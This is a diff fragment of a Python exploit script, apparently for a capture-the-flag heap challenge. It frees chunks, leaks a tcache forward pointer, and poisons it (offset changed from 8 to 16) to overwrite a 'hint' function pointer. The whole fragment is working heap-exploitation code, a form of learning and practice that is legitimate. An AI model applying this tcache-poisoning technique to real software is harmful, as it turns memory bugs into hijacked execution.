@@ -43,12 +43,12 @@ kill(0) # free clone 0
 kill(1) # free clone 1
 
 # leak the fwd pointer
-leak = u32(view(1))
+leak = int.from_bytes(view(1), byteorder='little')
 log.critical('Leaked Pointer: {}'.format(hex(leak)))
 
 # change fd pointer by 8 bytes to overlap with hint function pointer
-log.critical('Hint Pointer: {}'.format(hex(leak + 8)))
-name(1, p64(leak+8)) # fwd on 1 (ie the 2nd thing next allocated) is now 0's hint
+log.critical('Hint Pointer: {}'.format(hex(leak + 16)))
+name(1, p64(leak+16)) # fwd on 1 (ie the 2nd thing next allocated) is now 0's hint
 
 # allocate new chunk to overwrite hint pointer
 # this is the first item in the tcachebin ll, after this is allocated then a subsequent malloc will use
